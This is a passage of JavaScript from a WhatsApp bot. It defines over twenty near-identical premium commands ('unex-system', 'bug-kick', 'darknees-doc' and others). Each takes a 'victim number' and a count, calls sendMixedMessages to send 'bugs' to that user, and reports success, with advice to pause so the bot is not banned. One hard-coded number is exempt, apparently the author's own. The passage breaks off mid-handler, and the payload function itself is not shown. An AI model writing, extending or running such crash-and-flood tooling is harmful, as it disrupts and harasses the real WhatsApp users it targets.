    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-system": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "bug-kick": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-sql": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-ui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "unex-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-quoted": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-etc": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-myinter": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-button": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-location": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-polling": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-troli": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-audio": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-vn": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-viewonce": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-bussines": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-kontak": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-catalog": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-stc": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-doc": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-file": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-system": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "darknees-bug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
